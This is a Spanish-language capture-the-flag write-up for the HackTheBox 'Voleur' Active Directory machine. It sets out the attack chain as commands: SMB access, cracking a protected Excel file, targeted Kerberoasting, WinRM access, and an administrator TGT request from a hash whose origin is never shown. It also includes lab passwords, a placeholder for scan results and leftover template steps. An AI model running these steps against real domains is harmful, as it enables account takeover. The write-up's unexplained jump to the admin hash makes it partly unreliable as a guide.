---
title: "Voleur - Writeup"
difficulty: "Medium"
date: 2025-07-07
tags: [htb, windows, active-directory, kerberos, bloodhound]
---
# Voleur - HackTheBox Writeup

## Información Básica
| **Campo**       | **Valor**               |
|-----------------|-------------------------|
| IP              | 10.10.11.76             |
| Dominio         | voleur.htb              |
| Realm Kerberos  | VOLEUR.HTB              |
| Autor           | Irioshi                 |
| Fecha Resolución| 2025-07-06              |



## Reconocimiento

### Configuración Inicial

```bash
echo "10.10.11.76 dc.voleur.htb voleur.htb" | sudo tee -a /etc/hosts

Escaneo Nmap

nmap -sC -sV -p- --min-rate=5000 10.10.11.76

<details> <summary>Resultados Completos</summary>
# PEGA AQUÍ LOS RESULTADOS DE NMAP
</details>

Servicios clave identificados:

    Kerberos (88/tcp)

    SMB (445/tcp)

    WinRM (5985/tcp)

    SSH (2222/tcp)

Configuración Kerberos

cat /etc/krb5.conf

[libdefaults]
default_realm = VOLEUR.HTB
dns_lookup_realm = false
dns_lookup_kdc = false
ticket_lifetime = 24h
renew_lifetime = 7d
forwardable = true

[realms]
VOLEUR.HTB = {
  kdc = 10.10.11.76
  admin_server = 10.10.11.76
  default_domain = voleur.htb
}

[domain_realm]
.voleur.htb = VOLEUR.HTB
voleur.htb = VOLEUR.HTB

Acceso Inicial
Credenciales Iniciales

nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k

Enumeración SMB

KRB5CCNAME=ryan.naylor.ccache smbclient.py -k dc.voleur.htb


use IT
cd "First-Line Support"
get Access_Review.xlsx

Crackeo de Archivo Excel

   1.Extraer hash:

office2john Access_Review.xlsx > hash.txt

   2.Fuerza bruta:

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Contraseña: football1

    3.Descifrar archivo:

python3 -m msoffcrypto -p football1 Access_Review.xlsx decrypted.xlsx

Credenciales Obtenidas
Usuario	   Contraseña
svc_ldap   M1XyC9pW7qT5Vn
svc_iis	   N5pXyV1WqM7CZ8

Movimiento Lateral

BloodHound

bloodhound-python -u ryan.naylor -p 'HollowOct31Nyt' -c All -d VOLEUR.HTB -ns 10.10.11.76 --zip -k

Hallazgos clave:

    svc_ldap tiene GenericWrite sobre lacey.miller

    svc_ldap tiene WriteSPN sobre svc_winrm

Kerberoasting Dirigido

targetedKerberoast.py -k --dc-host dc.voleur.htb -u svc_ldap -d voleur.htb

Crackeo de Hash

john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

Contraseña de svc_winrm: AFireInsidedeOzarctica980219afi

Acceso vía WinRM

evil-winrm -i dc.voleur.htb -k -u svc_winrm -r VOLEUR.HTB

Bandera de usuario:

type C:\Users\svc_winrm\Desktop\user.txt

Escalada a Administrador

Método Directo (Golden Ticket)

getTGT.py -dc-ip 10.10.11.76 -hashes :e656e07c56d831611b577b160b259ad2 voleur.htb/administrator

evil-winrm -i dc.voleur.htb -k -u administrator -r VOLEUR.HTB

Bandera de root:

type C:\Users\Administrator\Desktop\root.txt

Lecciones Aprendidas

    Kerberos Authentication: La importancia de sincronizar el tiempo con el DC

    Password Management: Riesgos de almacenar contraseñas en hojas Excel

    Least Privilege: Peligro de permisos excesivos en cuentas de servicio

    Monitoring: Detección temprana de actividades de Kerberoasting

Herramientas Utilizadas

    Nmap

    BloodHound-Python

    John the Ripper

    Impacket

    Evil-WinRM

    office2john

Recursos Recomendados

    Kerberos Attacks Cheat Sheet

    Active Directory Security Best Practices

---

### Pasos para implementar:
1. Copia esta plantilla
2. Pégala en `_writeups/voleur.md`
3. Completa las secciones con tus hallazgos específicos
4. Agrega capturas de pantalla en `assets/images/voleur/`
5. Haz commit y push:
```bash


